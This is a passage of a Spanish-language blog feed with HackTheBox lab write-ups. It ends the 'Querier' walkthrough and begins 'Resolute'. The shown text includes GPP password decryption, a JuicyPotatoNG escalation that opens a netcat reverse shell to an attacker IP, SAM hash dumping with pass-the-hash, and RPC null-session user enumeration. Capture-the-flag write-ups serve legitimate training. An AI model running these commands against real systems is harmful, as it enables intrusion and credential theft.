SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer para enumerar la maquina es usar <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> PowerUp.ps1 10.10.15.11/PowerUp.ps1
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt      
</code></pre></div></div>

<ul>
  <li>Ahora importamos el modulo y lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Import-Module .<span class="se">\P</span>owerUp.ps1
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks
</code></pre></div></div>

<ul>
  <li>Después de ejecutarse nos da una contraseña para el usuario Administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 780
ProcessId   : 4268
Name        : 4268
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe <span class="nt">-k</span> netsvcs <span class="nt">-p</span>
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse <span class="nt">-Name</span> <span class="s1">'UsoSvc'</span>
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
IdentityReference : QUERIER<span class="se">\m</span>ssql-svc
Permissions       : <span class="o">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span class="o">}</span>
%PATH%            : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
Name              : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll <span class="nt">-DllPath</span> <span class="s1">'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'</span>

UnattendPath : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
Name         : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
Check        : Unattended Install Files

Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>
UserNames : <span class="o">{</span>Administrator<span class="o">}</span>
NewName   : <span class="o">[</span>BLANK]
Passwords : <span class="o">{</span>MyUnclesAreMarioAndLuigi!!1!<span class="o">}</span>
File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup
            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
Check     : Cached GPP Files
</code></pre></div></div>

<ul>
  <li>La encontró aquí.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">type</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\G</span><span class="s2">roup Policy</span><span class="se">\H</span><span class="s2">istory</span><span class="se">\{</span><span class="s2">31B2F340-016D-11D2-945F-00C04FB984F9}</span><span class="se">\M</span><span class="s2">achine</span><span class="se">\P</span><span class="s2">references</span><span class="se">\G</span><span class="s2">roups</span><span class="se">\G</span><span class="s2">roups.xml"</span>
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> ?&gt;&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>
&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2019-01-28 23:12:48"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{CD450F70-CDB8-4948-B908-F8D038C59B6C}"</span> <span class="nv">userContext</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">removePolicy</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">policyApplied</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>
&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"Administrator"</span><span class="o">&gt;</span>&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Pero si vemos la contraseña esta encriptada y se puede desencriptar con <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> aunque la herramienta ya no la dio en texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
</code></pre></div></div>

<ul>
  <li>Vamos a validar la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Gracias al output que nos dan <strong>Pwn3d!</strong> ya nos podemos conectar al servicio <code class="language-plaintext highlighter-rouge">winrm</code> empleando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>querier<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
38f63aa04664d186bccca4c48252e656
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="explotando-el-setimpersonateprivilege">Explotando el SetImpersonatePrivilege</h2>

<ul>
  <li>
    <p>Bueno explotar esto es muy fácil ya lo hemos echo muchas veces.</p>
  </li>
  <li>
    <p>Primero necesitamos traer ala maquina el <code class="language-plaintext highlighter-rouge">netcat</code> para Windows para ganar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> nc.exe 10.10.15.11/nc.exe
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>         4/5/2024   9:39 PM          28160 nc.exe                 
<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt               


PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> JuicyPotatoNG.exe 10.10.15.11/JuicyPotatoNG.exe
PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">rlwrap</code> con lo habíamos hecho antes.</p>
  </li>
  <li>
    <p>Nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; .<span class="se">\J</span>uicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\m</span><span class="s2">ssql-svc</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\n</span><span class="s2">c.exe 10.10.15.11 443 -e powershell"</span>
</code></pre></div></div>

<ul>
  <li>Y ahora recibimos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49686
Windows PowerShell
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.

PS C:<span class="se">\&gt;</span> <span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\&gt;</span>
</code></pre></div></div>

<h2 id="dumpeando-los-hashes-ntlm-almacenados-en-la-sam">Dumpeando los hashes NTLM almacenados en la SAM</h2>

<ul>
  <li>Y bueno algo extra es que como tenemos las credenciales del usuario administrador podemos <code class="language-plaintext highlighter-rouge">dumpear</code> los hashes de los demás usuario para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code> y conectarnos sin proporcionar contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span> <span class="nt">--sam</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.67.247   445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
SMB         10.129.67.247   445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
SMB         10.129.67.247   445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
SMB         10.129.67.247   445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Added 6 SAM hashes to the database
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 2dcefe78334b42c0ce483b8e1b2886ab

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>querier<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Resolute (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html" rel="alternate" type="text/html" title="HackTheBox - Resolute (medium)" /><published>2024-04-08T00:00:00-06:00</published><updated>2024-04-08T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/4c86a642ea237dfde036963e6d182b40.png" />
</p>

<p>En este post vamos a estar resolviendo la maquina Resolute de la plataforma de HackTheBox en la cual vamos a estar enumerando el protocolo RPC gracias a eso obtendremos una lista de usuarios del dominio con el cual con una contraseña que obtengamos en una descripcion veremos que le pertenece a un usuario para la escalada de privilegios abusaremos del grupo DnsAdmins en el cual inyectaremos un dll para obtener una reverse shell.</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Vamos a comenzar escaneando los puertos abiertos por el protocolo <strong>TCP</strong> con la herramienta <strong>Nmap</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49735 10.129.96.155 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-28 14:40 CST
Nmap scan report <span class="k">for </span>10.129.96.155
Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-28 20:47:27Z<span class="o">)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: MEGABANK<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49735/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m30s, median: 6m59s
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   <span class="nb">date</span>: 2024-03-28T20:48:21
|_  start_date: 2024-03-28T20:44:01
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE<span class="se">\x</span>00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System <span class="nb">time</span>: 2024-03-28T13:48:19-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos varios puertos abiertos entre ellos <strong>RCP</strong>, <strong>Ldap</strong>, con los cuales podemos enumerar mucho, pero primero vamos a comenzar añadiendo los dominios al <strong>/etc/hosts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.96.155
SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.96.155 megabank.local resolute.megabank.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.96.155 megabank.local resolute.megabank.local
</code></pre></div></div>

<ul>
  <li>De primeras no podemos enumerar nada por <strong>smb</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.129.96.155
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.129.96.155 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Bueno tenemos el protocolo <strong>RPC</strong> abierto asi que vamos a comenzar haciendo un <strong>Null Session</strong> para enumerar los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un listado potencial de usuarios vamos a ponerlos en una lista y probar un <strong>ASREPRoast</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  nmap <span class="nb">cat </span>users.txt
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
</code></pre></div></div>

<ul>
  <li>Bueno ningún usuario que tenemos es vulnerable a este ataque al parecer ningún usuario tiene configurado el <strong>UF_DONT_REQUIRE_PREAUTH</strong> <a href="https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23">https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-GetNPUsers megabank.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ryan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User marko doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User abigail doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User sally doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User angela doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User gustavo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User stevie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User paulo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User annette doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User per doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User melanie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User simon doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<h2 id="rpc-enumeración">RPC enumeración</h2>

<ul>
  <li>Bueno como pudimos autenticarnos sin proporcionar contraseña ni nada vamos a enumerar los usuarios para ver sus descripciones, ya que existen casos donde se comparten contraseñas en las descripciones, por ejemplo podemos ver la del usuario <strong>Administrador</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155
rpcclient <span class="nv">$&gt;</span> queryuser Administrator
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
